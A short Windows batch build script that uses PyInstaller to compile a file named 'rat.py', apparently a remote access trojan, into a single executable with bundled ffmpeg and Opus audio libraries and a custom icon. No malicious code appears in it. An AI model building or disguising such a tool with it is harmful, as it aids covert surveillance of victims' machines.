cd /d "%~dp0"
pyinstaller --onefile --additional-hooks-dir . --add-binary "ffmpeg.exe;." --add-binary "libopus-0.dll;." --hidden-import aiohttp --hidden-import certifi --icon=icon.ico rat.py
